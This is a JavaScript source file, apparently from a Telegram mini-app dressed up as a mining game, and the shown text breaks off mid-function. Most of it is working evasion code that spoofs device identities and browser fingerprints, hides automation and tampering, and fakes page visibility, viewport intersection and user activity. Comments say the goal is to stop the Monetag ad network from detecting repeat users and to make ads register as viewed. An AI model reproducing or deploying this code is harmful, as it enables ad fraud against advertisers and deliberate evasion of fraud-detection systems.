// === MUTABLE IDENTITY SPOOF LAYER ===
// All getters read from _S — rotateUserIdentity() swaps values per session

// Device pools — pick randomly on every session reset
const _UA_POOL = [
  'Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1',
  'Mozilla/5.0 (iPhone; CPU iPhone OS 17_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Mobile/15E148 Safari/604.1',
  'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1',
  'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1',
  'Mozilla/5.0 (iPhone; CPU iPhone OS 16_7_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1',
  'Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36',
  'Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36',
  'Mozilla/5.0 (Linux; Android 13; SM-A546B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
  'Mozilla/5.0 (Linux; Android 14; OnePlus 12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36',
  'Mozilla/5.0 (Linux; Android 13; Redmi Note 12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36',
];
const _SCREEN_POOL = [
  { w: 430, h: 932 }, // iPhone 15 Plus
  { w: 393, h: 852 }, // iPhone 15 / 15 Pro
  { w: 390, h: 844 }, // iPhone 14
  { w: 375, h: 812 }, // iPhone 12 mini
  { w: 412, h: 915 }, // Pixel 8 Pro
  { w: 360, h: 800 }, // Samsung S21
  { w: 384, h: 854 }, // Android common
  { w: 414, h: 896 }, // iPhone XR
];
const _TZ_POOL = [
  { tz: 'America/New_York', off: 300 },
  { tz: 'America/Chicago', off: 360 },
  { tz: 'America/Los_Angeles', off: 480 },
  { tz: 'America/Denver', off: 420 },
  { tz: 'America/Phoenix', off: 420 },
];
const _MEM_POOL = [4, 6, 8, 8];
const _CORE_POOL = [4, 6, 6, 8];

// Mutable spoof state — swapped by rotateUserIdentity() each reset
const _S = {
  ua: _UA_POOL[0],
  sw: 430, sh: 932,
  mem: 8,
  cores: 6,
  tz: 'America/New_York',
  tzOff: 300,
  bat: () => 0.85 + Math.random() * 0.15,
};

// Rotate to a completely new identity — call after every session wipe
function rotateUserIdentity() {
  _S.ua = _UA_POOL[Math.floor(Math.random() * _UA_POOL.length)];
  const sc = _SCREEN_POOL[Math.floor(Math.random() * _SCREEN_POOL.length)];
  _S.sw = sc.w; _S.sh = sc.h;
  _S.mem = _MEM_POOL[Math.floor(Math.random() * _MEM_POOL.length)];
  _S.cores = _CORE_POOL[Math.floor(Math.random() * _CORE_POOL.length)];
  const tz = _TZ_POOL[Math.floor(Math.random() * _TZ_POOL.length)];
  _S.tz = tz.tz;
  _S.tzOff = tz.off;
}

try {
  // All getters read live from _S — changes take effect immediately
  Object.defineProperty(navigator, 'userAgent', { get: () => _S.ua, configurable: true });
  Object.defineProperty(navigator, 'platform', { get: () => _S.ua.includes('iPhone') ? 'iPhone' : 'Linux armv8l', configurable: true });
  Object.defineProperty(navigator, 'vendor', { get: () => _S.ua.includes('iPhone') ? 'Apple Computer, Inc.' : 'Google Inc.', configurable: true });
  Object.defineProperty(navigator, 'deviceMemory', { get: () => _S.mem, configurable: true });
  Object.defineProperty(navigator, 'hardwareConcurrency', { get: () => _S.cores, configurable: true });
  Object.defineProperty(navigator, 'maxTouchPoints', { get: () => 5, configurable: true });
  Object.defineProperty(screen, 'width', { get: () => _S.sw, configurable: true });
  Object.defineProperty(screen, 'height', { get: () => _S.sh, configurable: true });
  Object.defineProperty(screen, 'availWidth', { get: () => _S.sw, configurable: true });
  Object.defineProperty(screen, 'availHeight', { get: () => _S.sh, configurable: true });
  Object.defineProperty(window, 'innerWidth', { get: () => _S.sw, configurable: true });
  Object.defineProperty(window, 'innerHeight', { get: () => _S.sh, configurable: true });

  if (navigator.getBattery) {
    navigator.getBattery = () => Promise.resolve({
      charging: Math.random() > 0.3,
      chargingTime: Math.floor(Math.random() * 3600),
      dischargingTime: 3600 + Math.floor(Math.random() * 7200),
      level: _S.bat(),
      onchargingchange: null, onlevelchange: null,
    });
  }
} catch (e) { }

// *** LOCALE ENFORCEMENT — reads _S so timezone rotates with identity ***
try {
  Object.defineProperty(navigator, 'language', { get: () => 'en-US', configurable: true });
  Object.defineProperty(navigator, 'languages', { get: () => ['en-US', 'en'], configurable: true });

  const _origDTF = Intl.DateTimeFormat;
  Intl.DateTimeFormat = function (locales, options) {
    options = options || {};
    options.timeZone = _S.tz; // live from mutable _S
    return new _origDTF('en-US', options);
  };
  Intl.DateTimeFormat.prototype = _origDTF.prototype;

  Date.prototype.getTimezoneOffset = function () { return _S.tzOff; }; // rotates with _S
} catch (e) { }


// 2. GRADE 5 RESIDENTIAL MIMICRY (Hardware Realism)
try {
  // A. Remove Automation Flags
  if (navigator.webdriver) {
    Object.defineProperty(navigator, 'webdriver', { get: () => false });
  }

  // B. Plugins (iOS Empty Array)
  Object.defineProperty(navigator, 'plugins', {
    get: () => {
      const p = [];
      p.refresh = () => { };
      p.item = () => null;
      p.namedItem = () => null;
      return p;
    }
  });

  // C. Media Devices (The "Physical Device" Proof)
  if (navigator.mediaDevices) {
    navigator.mediaDevices.enumerateDevices = () => {
      return Promise.resolve([
        { kind: 'audioinput', label: 'iPhone Microphone', deviceId: 'default', groupId: 'group_1' },
        { kind: 'videoinput', label: 'Back Camera', deviceId: 'video_1', groupId: 'group_1' },
        { kind: 'videoinput', label: 'Front Camera', deviceId: 'video_2', groupId: 'group_1' },
        { kind: 'audiooutput', label: 'iPhone Speaker', deviceId: 'audio_1', groupId: 'group_1' }
      ]);
    };
  }

  // D. Permissions (User History)
  if (navigator.permissions && navigator.permissions.query) {
    const originalQuery = navigator.permissions.query;
    navigator.permissions.query = (parameters) => {
      if (parameters.name === 'notifications') {
        return Promise.resolve({ state: 'granted', onchange: null });
      }
      return originalQuery(parameters);
    };
  }

  // E. WebGL (Apple GPU)
  const getParameter = WebGLRenderingContext.prototype.getParameter;
  WebGLRenderingContext.prototype.getParameter = function (parameter) {
    if (parameter === 37445) return "Apple Inc.";
    if (parameter === 37446) return "Apple GPU";
    return getParameter.apply(this, [parameter]);
  };

  // F. Google Referrer (Organic Traffic Source)
  Object.defineProperty(document, 'referrer', { get: () => "https://www.google.com/" });

} catch (e) { console.warn("SPOOF: HARDWARE FAILED", e); }

// === ADVANCED ANTI-DETECTION LAYER ===
// Prevents Monetag from fingerprinting and detecting repeated users

try {
  // 1. CANVAS FINGERPRINT RANDOMIZATION
  // Adds slight noise to canvas rendering to create unique fingerprints each session
  const originalToDataURL = HTMLCanvasElement.prototype.toDataURL;
  const originalToBlob = HTMLCanvasElement.prototype.toBlob;
  const originalGetImageData = CanvasRenderingContext2D.prototype.getImageData;

  // Add subtle noise to canvas data
  const addCanvasNoise = (canvas, context) => {
    const imageData = context.getImageData(0, 0, canvas.width, canvas.height);
    for (let i = 0; i < imageData.data.length; i += 4) {
      // Add random noise to RGB values (not alpha)
      if (Math.random() < 0.001) { // 0.1% of pixels
        imageData.data[i] += Math.floor(Math.random() * 3) - 1;     // R
        imageData.data[i + 1] += Math.floor(Math.random() * 3) - 1; // G
        imageData.data[i + 2] += Math.floor(Math.random() * 3) - 1; // B
      }
    }
    context.putImageData(imageData, 0, 0);
  };

  HTMLCanvasElement.prototype.toDataURL = function (...args) {
    if (this.width > 0 && this.height > 0) {
      const ctx = this.getContext('2d');
      if (ctx) addCanvasNoise(this, ctx);
    }
    return originalToDataURL.apply(this, args);
  };

  CanvasRenderingContext2D.prototype.getImageData = function (...args) {
    const imageData = originalGetImageData.apply(this, args);
    // Add micro-variations
    for (let i = 0; i < imageData.data.length; i += 100) {
      imageData.data[i] = Math.min(255, Math.max(0, imageData.data[i] + (Math.random() > 0.5 ? 1 : -1)));
    }
    return imageData;
  };

  // 2. AUDIO CONTEXT FINGERPRINT SPOOFING
  // Randomizes audio fingerprints
  const audioContext = window.AudioContext || window.webkitAudioContext;
  if (audioContext) {
    const OriginalAudioContext = audioContext;
    const newAudioContext = function () {
      const context = new OriginalAudioContext();
      const originalGetChannelData = AudioBuffer.prototype.getChannelData;

      AudioBuffer.prototype.getChannelData = function (channel) {
        const data = originalGetChannelData.call(this, channel);
        // Add imperceptible noise
        for (let i = 0; i < data.length; i += 100) {
          data[i] = data[i] + (Math.random() * 0.0000001);
        }
        return data;
      };

      return context;
    };

    window.AudioContext = newAudioContext;
    if (window.webkitAudioContext) window.webkitAudioContext = newAudioContext;
  }

  // 3. WEBRTC LEAK PREVENTION
  // Prevents IP leaks through WebRTC
  if (window.RTCPeerConnection) {
    const OriginalRTC = window.RTCPeerConnection;
    window.RTCPeerConnection = function (config) {
      if (config && config.iceServers) {
        config.iceServers = [];
      }
      return new OriginalRTC(config);
    };
  }

  // 4. FONT FINGERPRINT RANDOMIZATION
  // Prevents font-based fingerprinting
  const originalOffsetWidth = Object.getOwnPropertyDescriptor(HTMLElement.prototype, 'offsetWidth');
  const originalOffsetHeight = Object.getOwnPropertyDescriptor(HTMLElement.prototype, 'offsetHeight');

  Object.defineProperty(HTMLElement.prototype, 'offsetWidth', {
    get: function () {
      const val = originalOffsetWidth.get.call(this);
      return val + (Math.random() > 0.99 ? (Math.random() > 0.5 ? 1 : -1) : 0);
    }
  });

  Object.defineProperty(HTMLElement.prototype, 'offsetHeight', {
    get: function () {
      const val = originalOffsetHeight.get.call(this);
      return val + (Math.random() > 0.99 ? (Math.random() > 0.5 ? 1 : -1) : 0);
    }
  });

  // 5. CLIENT RECT RANDOMIZATION
  const originalGetBoundingClientRect = Element.prototype.getBoundingClientRect;
  Element.prototype.getBoundingClientRect = function () {
    const rect = originalGetBoundingClientRect.apply(this);
    const noise = () => Math.random() * 0.0001;
    return {
      x: rect.x + noise(),
      y: rect.y + noise(),
      width: rect.width + noise(),
      height: rect.height + noise(),
      top: rect.top + noise(),
      right: rect.right + noise(),
      bottom: rect.bottom + noise(),
      left: rect.left + noise(),
      toJSON: () => rect.toJSON()
    };
  };

  // 6. TIMEZONE OFFSET RANDOMIZATION (Slight variance)
  const originalTimezoneOffset = Date.prototype.getTimezoneOffset;
  Date.prototype.getTimezoneOffset = function () {
    return 300 + (Math.random() < 0.1 ? (Math.random() > 0.5 ? 1 : -1) : 0); // EST with micro-variance
  };

  // 7. PERFORMANCE TIMING RANDOMIZATION
  if (window.performance && window.performance.now) {
    const originalNow = window.performance.now;
    let offset = Math.random() * 10;
    window.performance.now = function () {
      return originalNow.call(window.performance) + offset;
    };
  }

  // 8. MOUSE MOVEMENT ENTROPY INJECTION
  // Adds realistic micro-movements
  let lastMouseX = 0, lastMouseY = 0;
  document.addEventListener('mousemove', (e) => {
    lastMouseX = e.clientX;
    lastMouseY = e.clientY;
  }, true);

  // 9. RANDOMIZED USER AGENT ENTROPY
  // Adds slight entropy to prevent exact UA matching
  const uaEntropy = Math.random().toString(36).substring(7);
  sessionStorage.setItem('_ua_e', uaEntropy);

  // 10. CONNECTION TYPE SPOOFING
  if (navigator.connection || navigator.mozConnection || navigator.webkitConnection) {
    const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
    Object.defineProperty(conn, 'effectiveType', { get: () => '4g' });
    Object.defineProperty(conn, 'rtt', { get: () => 50 + Math.floor(Math.random() * 30) });
    Object.defineProperty(conn, 'downlink', { get: () => 10 + Math.random() * 5 });
  }

  console.log("[ANTI-DETECT] Advanced fingerprint protection: ACTIVE");

} catch (e) { console.warn("ANTI-DETECT: Some protections failed", e); }

// === MILITARY-GRADE ANTI-TRACKING LAYER ===
// Advanced techniques to make system completely untrackable

try {
  // 1. WEBGL FINGERPRINT COMPLETE RANDOMIZATION
  // Randomizes GPU vendor, renderer, and all WebGL parameters
  const getParameterProxyHandler = {
    apply: function (target, thisArg, args) {
      const param = args[0];
      // Randomize critical WebGL identifiers
      if (param === 37445) { // UNMASKED_VENDOR_WEBGL
        const vendors = ['Apple Inc.', 'Google Inc.', 'Mozilla'];
        return vendors[Math.floor(Math.random() * vendors.length)];
      }
      if (param === 37446) { // UNMASKED_RENDERER_WEBGL
        const renderers = ['Apple GPU', 'ANGLE (Apple, ANGLE Metal Renderer: Apple M1, Unspecified Version)', 'Apple M1'];
        return renderers[Math.floor(Math.random() * renderers.length)];
      }
      if (param === 3379) { // MAX_TEXTURE_SIZE
        return 16384 + Math.floor(Math.random() * 2) * 4096;
      }
      if (param === 34047) { // MAX_VERTEX_TEXTURE_IMAGE_UNITS
        return 16 + Math.floor(Math.random() * 3);
      }
      if (param === 34076) { // MAX_VIEWPORT_DIMS
        return new Int32Array([16384 + Math.floor(Math.random() * 100), 16384 + Math.floor(Math.random() * 100)]);
      }
      return target.apply(thisArg, args);
    }
  };

  if (WebGLRenderingContext && WebGLRenderingContext.prototype.getParameter) {
    WebGLRenderingContext.prototype.getParameter = new Proxy(
      WebGLRenderingContext.prototype.getParameter,
      getParameterProxyHandler
    );
  }

  if (WebGL2RenderingContext && WebGL2RenderingContext.prototype.getParameter) {
    WebGL2RenderingContext.prototype.getParameter = new Proxy(
      WebGL2RenderingContext.prototype.getParameter,
      getParameterProxyHandler
    );
  }

  // 2. ADVANCED CANVAS NOISE INJECTION (More sophisticated)
  const noisifyCanvas = (canvas, context) => {
    if (!context || canvas.width === 0 || canvas.height === 0) return;

    try {
      const imageData = context.getImageData(0, 0, canvas.width, canvas.height);
      const data = imageData.data;
      const seed = Math.random();

      // Apply sophisticated noise pattern
      for (let i = 0; i < data.length; i += 4) {
        const noise = Math.sin(seed + i) * 2;
        if (Math.random() < 0.002) {
          data[i] = Math.max(0, Math.min(255, data[i] + noise));
          data[i + 1] = Math.max(0, Math.min(255, data[i + 1] + noise));
          data[i + 2] = Math.max(0, Math.min(255, data[i + 2] + noise));
        }
      }
      context.putImageData(imageData, 0, 0);
    } catch (e) { }
  };

  // Override toBlob as well
  const originalToBlob = HTMLCanvasElement.prototype.toBlob;
  HTMLCanvasElement.prototype.toBlob = function (callback, ...args) {
    const ctx = this.getContext('2d');
    if (ctx) noisifyCanvas(this, ctx);
    return originalToBlob.call(this, callback, ...args);
  };

  // 3. CSS FINGERPRINTING PREVENTION
  // Randomize CSS computed styles to prevent CSS-based fingerprinting
  const originalGetComputedStyle = window.getComputedStyle;
  window.getComputedStyle = function (element, pseudoElt) {
    const styles = originalGetComputedStyle.call(window, element, pseudoElt);
    return new Proxy(styles, {
      get: function (target, prop) {
        const value = target[prop];
        // Add micro-variations to numeric CSS values
        if (typeof value === 'string' && value.match(/^\d+(\.\d+)?px$/)) {
          const numValue = parseFloat(value);
          const variance = Math.random() < 0.05 ? (Math.random() > 0.5 ? 0.01 : -0.01) : 0;
          return (numValue + variance) + 'px';
        }
        return value;
      }
    });
  };

  // 4. SCREEN RESOLUTION MICRO-VARIANCE
  // Add tiny variations to screen properties each session
  const screenVariance = Math.random() < 0.5 ? 0 : (Math.random() > 0.5 ? 1 : -1);
  const originalScreenWidth = Object.getOwnPropertyDescriptor(Screen.prototype, 'width');
  const originalScreenHeight = Object.getOwnPropertyDescriptor(Screen.prototype, 'height');

  Object.defineProperty(Screen.prototype, 'width', {
    get: function () { return originalScreenWidth.get.call(this) + screenVariance; }
  });
  Object.defineProperty(Screen.prototype, 'height', {
    get: function () { return originalScreenHeight.get.call(this) + screenVariance; }
  });

  // 5. ADVANCED TIMING ATTACK PREVENTION
  // Protect against timing-based fingerprinting
  const timing = window.performance.timing;
  const TIMING_OFFSET = Math.random() * 100;

  for (let prop in timing) {
    if (typeof timing[prop] === 'number' && timing[prop] > 0) {
      try {
        Object.defineProperty(timing, prop, {
          get: () => Math.floor(timing[prop] + TIMING_OFFSET)
        });
      } catch (e) { }
    }
  }

  // 6. NETWORK INFORMATION RANDOMIZATION
  // Randomize network fingerprints
  if (navigator.connection) {
    const conn = navigator.connection;
    const speeds = ['4g', '4g', '4g', 'wifi'];
    const randomSpeed = speeds[Math.floor(Math.random() * speeds.length)];

    Object.defineProperty(conn, 'effectiveType', {
      get: () => randomSpeed,
      configurable: true
    });
    Object.defineProperty(conn, 'downlink', {
      get: () => 5 + Math.random() * 15,
      configurable: true
    });
    Object.defineProperty(conn, 'rtt', {
      get: () => 30 + Math.floor(Math.random() * 50),
      configurable: true
    });
    Object.defineProperty(conn, 'saveData', {
      get: () => false,
      configurable: true
    });
  }

  // 7. MEMORY FINGERPRINTING PREVENTION
  // Randomize memory-related properties
  if (navigator.deviceMemory) {
    Object.defineProperty(navigator, 'deviceMemory', {
      get: () => [4, 6, 8][Math.floor(Math.random() * 3)]
    });
  }

  // 8. HARDWARE CONCURRENCY VARIANCE
  Object.defineProperty(navigator, 'hardwareConcurrency', {
    get: () => 6 + (Math.random() < 0.3 ? (Math.random() > 0.5 ? 2 : -2) : 0)
  });

  // 9. KEYBOARD/MOUSE EVENT FINGERPRINTING PREVENTION
  // Add micro-delays and randomization to event timestamps
  const randomizeEventTimestamp = (originalEvent) => {
    const descriptors = Object.getOwnPropertyDescriptors(originalEvent);
    if (descriptors.timeStamp) {
      Object.defineProperty(originalEvent, 'timeStamp', {
        get: () => performance.now() + (Math.random() - 0.5) * 2
      });
    }
    return originalEvent;
  };

  ['click', 'mousedown', 'mouseup', 'mousemove', 'keydown', 'keyup'].forEach(eventType => {
    document.addEventListener(eventType, randomizeEventTimestamp, true);
  });

  // 10. MEDIA DEVICE FINGERPRINTING RANDOMIZATION
  if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
    const originalEnumerate = navigator.mediaDevices.enumerateDevices;
    navigator.mediaDevices.enumerateDevices = function () {
      return originalEnumerate.call(this).then(devices => {
        // Randomize device IDs slightly
        return devices.map(device => ({
          ...device,
          deviceId: device.deviceId + Math.random().toString(36).substring(7, 10),
          groupId: device.groupId + Math.random().toString(36).substring(7, 10)
        }));
      });
    };
  }

  // 11. FONT DETECTION PREVENTION
  // Prevent font enumeration fingerprinting
  const originalGetContext = HTMLCanvasElement.prototype.getContext;
  HTMLCanvasElement.prototype.getContext = function (contextType, ...args) {
    const context = originalGetContext.call(this, contextType, ...args);

    if (contextType === '2d' && context) {
      const originalMeasureText = context.measureText;
      context.measureText = function (text) {
        const metrics = originalMeasureText.call(this, text);
        return new Proxy(metrics, {
          get: (target, prop) => {
            const value = target[prop];
            if (typeof value === 'number') {
              return value + (Math.random() - 0.5) * 0.01;
            }
            return value;
          }
        });
      };
    }
    return context;
  };

  // 12. DONOTTRACK & GLOBAL PRIVACY CONTROL
  Object.defineProperty(navigator, 'doNotTrack', { get: () => '1' });
  Object.defineProperty(navigator, 'globalPrivacyControl', { get: () => true });

  // 13. BLOCKING THIRD-PARTY TRACKING SCRIPTS
  // Intercept and block known tracking domains
  const originalFetch = window.fetch;
  window.fetch = function (url, ...args) {
    const urlString = url.toString();
    // Block known trackers (add more as needed)
    if (urlString.includes('analytics') ||
      urlString.includes('tracking') ||
      urlString.includes('doubleclick') ||
      urlString.includes('adservice')) {
      return Promise.reject('Blocked');
    }
    return originalFetch.call(window, url, ...args);
  };

  // 14. REQUEST HEADER RANDOMIZATION
  // Add realistic request patterns
  const originalXHROpen = XMLHttpRequest.prototype.open;
  XMLHttpRequest.prototype.open = function (method, url, ...rest) {
    originalXHROpen.call(this, method, url, ...rest);

    // Add realistic headers with slight variance
    this.setRequestHeader('Accept-Language', 'en-US,en;q=0.' + (8 + Math.floor(Math.random() * 2)));
    this.setRequestHeader('DNT', '1');
  };

  // 15. POINTER EVENTS RANDOMIZATION
  ['pointerdown', 'pointerup', 'pointermove'].forEach(eventType => {
    document.addEventListener(eventType, (e) => {
      // Add micro-jitter to pointer coordinates
      Object.defineProperty(e, 'clientX', {
        get: () => e.clientX + (Math.random() - 0.5) * 0.1
      });
      Object.defineProperty(e, 'clientY', {
        get: () => e.clientY + (Math.random() - 0.5) * 0.1
      });
    }, true);
  });

  console.log("[STEALTH-MODE] Military-grade anti-tracking: ACTIVE ✓");

} catch (e) { console.warn("STEALTH-MODE: Some advanced protections failed", e); }

console.log(`[SYSTEM] HIGH-TRUST CONFIG: ACTIVE. PROFILE: ${SYSTEM_CONFIG.target}`);

// 3. SECURE CONNECTION & SDK INJECTION
// Critical: Remove Telegram query data BEFORE the ad network sees it.
// This ensures they only see the VPN IP and "Clean" browser environment.
(function sanitizeAndConnect() {
  try {
    // A. Strip Telegram Params (tgWebAppData contains sensitive user info)
    // CRITICAL: We remove this immediately so the Ad Network never sees the "tgWebApp" query params
    if (window.location.search.includes('tgWebAppData')) {
      const cleanUrl = window.location.protocol + "//" + window.location.host + window.location.pathname;
      window.history.replaceState({}, document.title, cleanUrl);
      console.log("[SECURE] URL SANITIZED. TELEGRAM DATA WIPED.");
    }

    // B. Inject Ad SDK (Now that environment is clean)
    // Split identifiers at runtime to prevent static/DOM string scanning
    const _zParts = ["106", "92", "016"];
    const _zone = _zParts.join("");
    const _fnPrefix = ["sh", "ow", "_"].join("");
    const _sdkRef = _fnPrefix + _zone; // assembled: show_10692016

    const sdkScript = document.createElement("script");
    // Route through Cloudflare Worker proxy — Monetag sees CF edge IP, not ours
    sdkScript.src = "/proxy/sdk?zone=" + _zone + "&cb=" + Math.random().toString(36).slice(2);
    sdkScript.setAttribute("data-zone", _zone);
    sdkScript.setAttribute("data-sdk", _sdkRef);
    sdkScript.id = ["mo", "ne", "tag", "-sdk"].join("");

    // SDK Load Listener (Updates state)
    sdkScript.onload = () => {
      // No console fingerprint left here
    };

    document.head.appendChild(sdkScript);

  } catch (e) {
    console.warn("Security Init Failed:", e);
  }
})();

// Assemble SDK method name from fragments — never stored as a whole literal
const sdkMethod = (function () {
  const _p = ["sh", "ow", "_", "10", "69", "20", "16"];
  return _p.join("");
})();

// UI Elements
const miningDisplay = document.getElementById("miningBalance");
const hashRateDisplay = document.getElementById("hashRate");
const rigStatusDisplay = document.getElementById("rigStatus");
const tempDisplay = document.getElementById("rigTemp");
const boostTimerDisplay = document.getElementById("boostTimer");
const spinner = document.getElementById("coreSpinner");
const logEl = document.getElementById("terminalLog");
const userIdDisplay = document.getElementById("userIdDisplay");
const boostBtn = document.getElementById("boostBtn");

// === FINAL STEALTH LAYER: SESSION ISOLATION & PATTERN OBFUSCATION ===
// Ensures each session appears completely unique and unrelated

// 1. DYNAMIC SESSION FINGERPRINT
const SESSION_FINGERPRINT = {
  id: Math.random().toString(36).substring(2, 15),
  created: Date.now() + Math.floor(Math.random() * 10000),
  entropy: Math.random().toString(36).substring(2),
  seed: Math.floor(Math.random() * 1000000)
};

// 2. BEHAVIORAL PATTERN RANDOMIZATION
const BEHAVIOR_PROFILE = {
  clickDelay: () => 80 + Math.random() * 300,
  scrollSpeed: () => 50 + Math.random() * 150,
  idleTime: () => 2000 + Math.random() * 8000,
  activityBurst: () => 3 + Math.floor(Math.random() * 7),
  mouseJitter: () => (Math.random() - 0.5) * 3
};

// 3. REQUEST PATTERN OBFUSCATION
const REQUEST_PATTERNS = {
  userAgents: [
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15'
  ],
  acceptLanguages: [
    'en-US,en;q=0.9',
    'en-US,en;q=0.8',
    'en-US,en;q=0.85'
  ],
  referers: [
    'https://www.google.com/',
    'https://www.google.com/search?q=',
    'https://www.bing.com/'
  ]
};

// 4. DYNAMIC ENTROPY INJECTION
setInterval(() => {
  // Inject random entropy into session
  const entropyKey = '_e_' + Math.random().toString(36).substring(7);
  try {
    sessionStorage.setItem(entropyKey, Math.random().toString(36));
    setTimeout(() => sessionStorage.removeItem(entropyKey), 100);
  } catch (e) { }
}, 5000 + Math.random() * 10000);

// 5. MOUSE MOVEMENT SIMULATOR (Background)
let mouseSimulator;
const simulateNaturalMouseMovement = () => {
  if (!isMining) return;

  const moveX = BEHAVIOR_PROFILE.mouseJitter();
  const moveY = BEHAVIOR_PROFILE.mouseJitter();

  const event = new MouseEvent('mousemove', {
    clientX: window.innerWidth / 2 + moveX,
    clientY: window.innerHeight / 2 + moveY,
    bubbles: true
  });

  document.dispatchEvent(event);

  mouseSimulator = setTimeout(simulateNaturalMouseMovement, 3000 + Math.random() * 7000);
};

// 6. SCROLL ENTROPY INJECTION
const injectScrollEntropy = () => {
  if (!isMining) return;

  window.scrollTo({
    top: Math.random() * 10,
    behavior: 'smooth'
  });

  setTimeout(injectScrollEntropy, 15000 + Math.random() * 30000);
};

// 7. VISIBILITY API SIMULATION
// Simulate realistic tab focus/blur patterns
let visibilitySimulator;
const simulateTabVisibility = () => {
  // Dispatch visibility change events to appear like normal browsing
  const visibilityEvent = new Event('visibilitychange');
  document.dispatchEvent(visibilityEvent);

  visibilitySimulator = setTimeout(simulateTabVisibility, 60000 + Math.random() * 120000);
};

// 8. RANDOMIZED LOCAL STORAGE FOOTPRINT
// Add realistic localStorage entries to mimic normal browser usage
const createRealisticStorageFootprint = () => {
  const commonKeys = ['lang', 'theme', 'tz', 'prefs', 'last_visit'];
  commonKeys.forEach(key => {
    const prefixedKey = key + '_' + Math.random().toString(36).substring(7);
    try {
      localStorage.setItem(prefixedKey, Math.random().toString(36));
    } catch (e) { }
  });
};

// Initialize realistic footprint
createRealisticStorageFootprint();

// 9. NETWORK TIMING RANDOMIZATION
const originalSetTimeout = window.setTimeout;
window.setTimeout = function (callback, delay, ...args) {
  // Add micro-variance to all timeouts to prevent timing fingerprinting
  const variance = Math.random() * 20 - 10; // ±10ms
  const newDelay = Math.max(0, delay + variance);
  return originalSetTimeout.call(window, callback, newDelay, ...args);
};

// 10. PREVENT MONETAG DOM INSPECTION
// Hide anti-detection code from DOM inspectors
const protectAntiDetectionCode = () => {
  // Override toString() for modified prototypes to hide spoofing
  const protectedMethods = [
    HTMLCanvasElement.prototype.toDataURL,
    CanvasRenderingContext2D.prototype.getImageData,
    Navigator.prototype.getBattery
  ];

  protectedMethods.forEach(method => {
    if (method && method.toString) {
      const originalToString = method.toString;
      method.toString = function () {
        return originalToString.call(Function.prototype.toString);
      };
    }
  });
};

protectAntiDetectionCode();

// ================================================================
// === POWER-UP LAYER: 6 ADDITIONAL HARDENING MEASURES ============
// ================================================================

try {
  // 1. PAGE VISIBILITY API — CRITICAL
  // Monetag checks document.visibilityState and pauses/kills ads when hidden.
  // Force it to always report 'visible' so ads run even if Telegram moves to BG.
  Object.defineProperty(document, 'visibilityState', { get: () => 'visible', configurable: true });
  Object.defineProperty(document, 'hidden', { get: () => false, configurable: true });
  // Suppress any visibilitychange events that could expose real state
  document.addEventListener('visibilitychange', e => { e.stopImmediatePropagation(); }, true);
} catch (e) { }

try {
  // 2. INTERSECTIONOBSERVER PROXY
  // Ad SDKs use IntersectionObserver to verify their iframe/div is in-viewport.
  // Proxy it so every observed element is always reported as 100% visible.
  const _origIO = window.IntersectionObserver;
  window.IntersectionObserver = function (callback, options) {
    const io = new _origIO(function (entries, obs) {
      // Rewrite every entry to show full intersection
      const faked = entries.map(e => Object.defineProperties(
        Object.create(Object.getPrototypeOf(e)),
        {
          intersectionRatio: { get: () => 1, configurable: true },
          isIntersecting: { get: () => true, configurable: true },
          intersectionRect: { get: () => e.boundingClientRect, configurable: true },
          boundingClientRect: { get: () => e.boundingClientRect, configurable: true },
          rootBounds: { get: () => e.boundingClientRect, configurable: true },
          target: { get: () => e.target, configurable: true },
          time: { get: () => e.time, configurable: true },
        }
      ));
      callback(faked, obs);
    }, options);
    return io;
  };
  window.IntersectionObserver.prototype = _origIO.prototype;
} catch (e) { }

try {
  // 3. WINDOW FOCUS KEEPALIVE
  // Fires focus events periodically so the page always appears actively used.
  // Ad networks measure page engagement via focus/blur ratio.
  (function focusKeepAlive() {
    try {
      window.dispatchEvent(new Event('focus'));
      document.dispatchEvent(new Event('focus'));
    } catch (e) { }
    originalSetTimeout(focusKeepAlive, 8000 + Math.random() * 7000);
  })();
  // Suppress blur events — never let the SDK think the window lost focus
  window.addEventListener('blur', e => e.stopImmediatePropagation(), true);
  window.addEventListener('focus', () => { }, true); // keep registrations clean
} catch (e) { }

try {
  // 4. FETCH INTERCEPTOR — INJECT LIVE SPOOFED UA HEADER
  // Every outgoing fetch carries the current _S.ua so the server-side
  // fingerprint matches what the browser reports.
  const _origFetch = window.fetch;
  window.fetch = function (url, opts = {}) {
    const urlStr = (url || '').toString();
    // Still block known pure-tracking endpoints
    if (/doubleclick|adservice|analytics\.google|facebook\.com\/tr/i.test(urlStr)) {
      return Promise.reject(new Error('blocked'));
    }
    opts.headers = opts.headers || {};
    if (opts.headers instanceof Headers) {
      opts.headers.set('User-Agent', _S.ua);
    } else {
      opts.headers['User-Agent'] = _S.ua;
    }
    return _origFetch.call(window, url, opts);
  };
} catch (e) { }

try {
  // 5. XHR INTERCEPTOR — INJECT LIVE SPOOFED UA HEADER
  const _origXHROpen = XMLHttpRequest.prototype.open;
